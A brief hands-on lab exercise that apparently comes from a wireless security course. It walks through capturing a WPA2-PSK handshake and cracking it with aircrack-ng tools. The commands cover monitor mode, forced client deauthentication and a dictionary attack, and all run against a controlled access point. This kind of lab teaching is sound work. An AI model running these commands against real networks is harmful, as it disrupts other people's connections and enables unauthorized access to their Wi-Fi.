Hands-on Activity
Capture and crack WPA2-PSK
Use a controlled AP with a known weak PSK and a connected client to practice the full workflow safely.
Starter commands
sudo airmon-ng start wlan0
sudo airodump-ng --bssid <TARGET_AP_BSSID> -c <CHANNEL> -w wpa_handshake_capture wlan0mon
sudo aireplay-ng --deauth 5 -a <TARGET_AP_BSSID> -c <TARGET_CLIENT_MAC> wlan0mon
sudo aircrack-ng -w /path/to/custom_wordlist.txt wpa_handshake_capture-01.cap
Checklist
  • Confirm monitor mode and note interface name.
  • Verify airodump-ng shows the handshake indicator.
  • Use a focused wordlist containing the lab PSK for speed.
  • Stop injection immediately after capture.
